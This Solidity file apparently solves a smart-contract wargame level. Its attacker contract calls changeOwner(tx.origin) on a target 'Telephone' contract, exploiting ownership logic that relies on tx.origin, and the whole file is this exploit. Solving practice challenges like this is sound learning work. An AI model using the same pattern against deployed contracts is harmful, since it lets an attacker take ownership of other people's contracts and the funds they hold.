// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    ITelephone public telephone;

    constructor(address _telephone) {
        telephone = ITelephone(_telephone);
    }

    function attack() external {
        telephone.changeOwner(tx.origin);
    }
}